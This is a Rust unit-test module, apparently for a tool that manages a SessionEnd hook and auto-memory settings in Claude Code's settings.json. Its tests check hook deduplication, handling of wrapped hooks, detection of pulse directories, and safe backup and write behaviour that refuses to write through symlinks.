            notes.iter().any(|n| n.contains("removed a duplicate")),
            "{notes:?}"
        );

        let expected =
            "/usr/local/bin/recall-echo archive-session --pulse-root '/home/d/.wiseferry'";
        let text = settings.to_string();
        assert_eq!(text.matches(expected).count(), 1, "{text}");
        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
        // And a second run has nothing left to do.
        let (changed, _) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(!changed);
    }

    /// A prefix wrapper carries no shell operator, but it is customization
    /// all the same — `timeout 30 recall-echo archive-session` exists to
    /// bound a hang, and rewriting it would silently drop the bound.
    #[test]
    fn a_prefix_wrapped_hook_is_not_rewritten() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "timeout 30 /usr/local/bin/recall-echo archive-session"}]
                }]
            }
        });
        let (_, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(notes.iter().any(|n| n.contains("unchanged")), "{notes:?}");

        let text = settings.to_string();
        assert!(text.contains("timeout 30 /usr/local/bin/recall-echo archive-session"));
        // The wrapped hook stays the only one — no canonical duplicate added.
        assert_eq!(text.matches("archive-session").count(), 1, "{text}");
    }

    /// A canonical hook whose quoted root happens to contain shell operators
    /// (`;` is a legal path byte) is still ours: the operator scan must look
    /// outside the quotes, or our own hooks become permanently unrepairable.
    #[test]
    fn a_quoted_root_with_operators_stays_repairable() {
        let mut settings = serde_json::json!({
            "hooks": {
                "SessionEnd": [{
                    "hooks": [{"type": "command", "command": "/usr/local/bin/recall-echo archive-session --pulse-root '/tmp/a;b'"}]
                }]
            }
        });
        let (changed, notes) = upsert(&mut settings, "/home/d/.wiseferry");
        assert!(changed, "{notes:?}");

        let text = settings.to_string();
        assert!(text.contains("--pulse-root '/home/d/.wiseferry'"), "{text}");
        assert!(!text.contains("/tmp/a;b"), "{text}");
    }

    #[test]
    fn auto_memory_on_table() {
        use serde_json::json;
        let cases = [
            (json!({}), None, true),
            (json!({"autoMemoryEnabled": true}), None, true),
            (json!({"autoMemoryEnabled": false}), None, false),
            (json!({}), Some("1"), false),
            (json!({}), Some("TRUE"), false),
            (json!({}), Some("0"), true),
            (json!({}), Some(""), true),
            (json!({"env": {AUTO_MEMORY_ENV: "1"}}), None, false),
            (json!({"env": {AUTO_MEMORY_ENV: "false"}}), None, true),
        ];
        for (settings, env, on) in cases {
            assert_eq!(auto_memory_on(&settings, env), on, "{settings} env={env:?}");
        }
    }

    #[test]
    fn no_claude_code_skips_every_step() {
        let tmp = tempfile::tempdir().unwrap();
        let roots = paths::ConfigRoots::sandboxed(tmp.path())
            .unwrap()
            .without_claude_code();
        assert_eq!(
            claude_code_target(&roots, tmp.path()).err(),
            Some(Skip::NoClaudeCode)
        );
    }

    #[test]
    fn a_pulse_root_gets_hooks_but_not_the_memory_steps() {
        let tmp = tempfile::tempdir().unwrap();
        let roots = paths::ConfigRoots::sandboxed(tmp.path()).unwrap();
        let pulse = tmp.path().join("echo");
        fs::create_dir_all(&pulse).unwrap();
        fs::write(pulse.join("pulse-null.toml"), "[pulse]\n").unwrap();

        let target = claude_code_target(&roots, &pulse).expect("hooks still run");
        assert_eq!(target.memory_steps(), Err(&Skip::PulseRoot));

        let plain = claude_code_target(&roots, tmp.path()).unwrap();
        assert_eq!(plain.memory_steps(), Ok(()));
    }

    fn plant_pulse(dir: &Path) {
        fs::create_dir_all(dir).unwrap();
        fs::write(dir.join("pulse-null.toml"), "[pulse]\n").unwrap();
    }

    #[test]
    fn pulses_are_found_in_every_shape_pulse_null_discovers() {
        let home = tempfile::tempdir().unwrap();
        let h = home.path();
        plant_pulse(&h.join("pulse-null/echo"));
        plant_pulse(&h.join("pulse-null/pulses/synth"));
        plant_pulse(&h.join("pulse-null/entities/old"));
        plant_pulse(&h.join("entity"));
        // Not pulses: no toml, and a symlink to a pulse.
        fs::create_dir_all(h.join("pulse-null/notes")).unwrap();
        std::os::unix::fs::symlink(h.join("pulse-null/echo"), h.join("pulse-null/alias")).unwrap();

        assert_eq!(
            pulses_in(h),
            vec![
                h.join("entity"),
                h.join("pulse-null/echo"),
                h.join("pulse-null/entities/old"),
                h.join("pulse-null/pulses/synth"),
            ]
        );
    }

    /// The user runs pulses and the target is their own `~/.claude`: every
    /// Claude Code step is skipped, hooks included.
    #[test]
    fn a_pulse_users_own_claude_dir_gets_no_hooks_either() {
        let tmp = tempfile::tempdir().unwrap();
        let roots = paths::ConfigRoots::sandboxed(tmp.path()).unwrap();
        plant_pulse(&tmp.path().join("pulse-null/pulses/echo"));
        let plain_root = tmp.path().join("store");
        fs::create_dir_all(&plain_root).unwrap();

        let skip = claude_code_target(&roots, &plain_root)
            .err()
            .expect("skipped");
        assert_eq!(
            skip,
            Skip::PulseHome(vec![tmp.path().join("pulse-null/pulses/echo")])
        );
        assert!(skip.to_string().contains("user-level hooks"), "{skip}");
    }

    /// Pulses in the home, but a Claude Code directory elsewhere: its hooks
    /// do not fire for the pulses, so only the memory steps are skipped.
    #[test]
    fn a_home_with_pulses_skips_only_the_memory_steps_for_another_claude_dir() {
        let tmp = tempfile::tempdir().unwrap();
        let home = tempfile::tempdir().unwrap();
        plant_pulse(&home.path().join("entity"));
        let roots = paths::ConfigRoots::sandboxed(tmp.path())
            .unwrap()
            .with_home(home.path());
        let plain_root = tmp.path().join("store");
        fs::create_dir_all(&plain_root).unwrap();

        let target = claude_code_target(&roots, &plain_root).expect("hooks still run");
        assert_eq!(
            target.memory_steps(),
            Err(&Skip::PulseHome(vec![home.path().join("entity")]))
        );
    }

    /// `.bak` is the replaced bytes, owner-only, and a symlink planted at the
    /// `.bak` path is replaced rather than followed (#75 audit L3).
    #[test]
    fn commit_keeps_an_owner_only_backup_and_never_writes_through_a_symlink() {
        use std::os::unix::fs::PermissionsExt;
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("settings.json");
        fs::write(&path, r#"{"model": "opus"}"#).unwrap();
        let victim = tmp.path().join("victim");
        fs::write(&victim, "untouched").unwrap();
        std::os::unix::fs::symlink(&victim, path.with_extension("json.bak")).unwrap();

        let OpenSettings::Edit(mut edit) = open_settings(&path) else {
            panic!("a readable settings.json");
        };
        disable_auto_memory(&mut edit.value);
        assert_eq!(edit.commit(|_| Ok(())), Ok(Committed::Written));

        assert_eq!(fs::read_to_string(&victim).unwrap(), "untouched");
        let bak = path.with_extension("json.bak");
        assert!(!fs::symlink_metadata(&bak).unwrap().file_type().is_symlink());
        assert_eq!(fs::read_to_string(&bak).unwrap(), r#"{"model": "opus"}"#);
        assert_eq!(
            fs::metadata(&bak).unwrap().permissions().mode() & 0o777,
            0o600
        );
    }

    #[test]
    fn commit_refuses_a_settings_file_that_became_a_symlink() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("settings.json");
        fs::write(&path, r#"{"model": "opus"}"#).unwrap();
        let OpenSettings::Edit(mut edit) = open_settings(&path) else {
            panic!("a readable settings.json");
        };
        disable_auto_memory(&mut edit.value);

        // During the prompt, a dotfiles manager swaps in a symlink.
        let dotfiles = tmp.path().join("dotfiles.json");
        fs::write(&dotfiles, r#"{"model": "opus"}"#).unwrap();
        fs::remove_file(&path).unwrap();
        std::os::unix::fs::symlink(&dotfiles, &path).unwrap();

        let err = edit.commit(|_| Ok(())).unwrap_err();
        assert!(err.contains("became a symlink"), "{err}");
        assert!(fs::symlink_metadata(&path)
            .unwrap()
            .file_type()
            .is_symlink());
        assert_eq!(
            fs::read_to_string(&dotfiles).unwrap(),
            r#"{"model": "opus"}"#
        );
    }

    #[test]
    fn open_settings_refuses_a_top_level_that_is_not_an_object() {
        let tmp = tempfile::tempdir().unwrap();
        for body in ["[]", "\"text\"", "42", "null", "{broken"] {
            let path = tmp.path().join("settings.json");
            fs::write(&path, body).unwrap();
            assert!(
                matches!(open_settings(&path), OpenSettings::Refused(_)),
                "{body} must be refused"
            );
        }
    }

    #[test]
    fn open_settings_treats_a_missing_file_as_empty() {
        let tmp = tempfile::tempdir().unwrap();
        match open_settings(&tmp.path().join("settings.json")) {
            OpenSettings::Edit(edit) => assert_eq!(edit.value, serde_json::json!({})),
            _ => panic!("a missing settings.json is a fresh one"),
        }
    }

    #[test]
    fn disable_auto_memory_sets_the_key_and_keeps_the_rest() {
        let mut settings = serde_json::json!({"model": "opus"});
        disable_auto_memory(&mut settings);
        assert_eq!(
            settings,
            serde_json::json!({"model": "opus", "autoMemoryEnabled": false})
        );
    }
}
